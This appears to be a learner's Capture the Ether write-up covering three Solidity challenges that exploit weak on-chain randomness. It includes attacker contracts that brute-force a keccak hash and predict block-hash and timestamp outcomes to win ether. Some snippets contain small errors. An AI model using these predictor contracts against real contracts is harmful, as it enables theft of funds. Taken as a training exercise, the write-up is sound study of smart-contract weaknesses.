## Day 4

### Capture the Ether Guess the secret number

The objective here is to guess the secret number, however the number is not put in code only the Keccak hash of the number.  It is very hard to reverse a Keccak256 hash, but we can try to guess the number until we find a solution.  The input is only 8 bit, so there are only 256 possibilities which can easily be tried in a sperate contract.  Code for doing this is below.  

```Java
pragma solidity ^0.4.21;

contract BruteForce {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    function findSol() external view returns (uint8) {

        for (uint8 i = 0; i < 255; i++) {
            if (keccak256(i) == answerHash) {
                return i;
            }
        }

        return 0;
    }
}
```

### Capture the Ether Guess the new number

Once again the objective is to guess the number, this time it is generated when the guess is made as in the following code: 

```Java
    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
```

If we know the block number, and the timestamp we will be able to compute the number.  We can construct a contract to do this since the transaction, the contract will use the same block number and the same timestamp as these will be common in one transaction.  

Code to do this is given below: 

```Java
contract BlockBasedPredictor {
    GuessTheNewNumberChallenge challenge;

    function BlockBasedPredictor(address challengeAddress) public payable {
        challenge = GuessTheNewNumberChallenge(challengeAddress);
        require(msg.value == 10 ether);
    }

    /**
    Generates a guess for the next block number.
    */
    function ansForNextBlock() public view returns (uint8) {
        return uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function sendAns() external {
        uint8 myGuess = ansForNextBlock();
        challenge.guess.value(1 ether)(myGuess);
    }

}
```

### Capture the Ether predict the future

Once again the objective is to guess the random number, and this time the guess must be given ahead of time.  The contract requires you to lockInGuess(), then when you are ready for your guess to be tested you must call settle().  The relevant functions are listed below.  

```Java
    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
```

We can set up a contract that will read the block.number and current timestamp, then if we will get the same answer as our guess we can call settle() else revert.  

```Java
// SPDX-License-Identifier: No License
pragma solidity 0.8.17;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract PredictFutureSolver {

    IPredictTheFutureChallenge public challenge;
    address public owner;
    uint8 myGuess = 6;

    constructor(address _challengeAddress) {
        challenge = IPredictTheFutureChallenge(_challengeAddress);
        owner = msg.sender;
    }

    function lock() external payable {
        require(msg.value == 0.1 ether, "You must send an ether, first");
        challenge.lockInGuess{value: 0.1 ether}(myGuess);
    }

    event GuessMade(uint8 guessVal);

    function solve() public {
        require(msg.sender == owner, "Only the owner can solve this challenge");
        
        uint8 proposedAnswer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        emit GuessMade(proposedAnswer);

        require(proposedAnswer == myGuess, "the guess was wrong");
        challenge.settle();
    }

    receive() external payable {}

}
```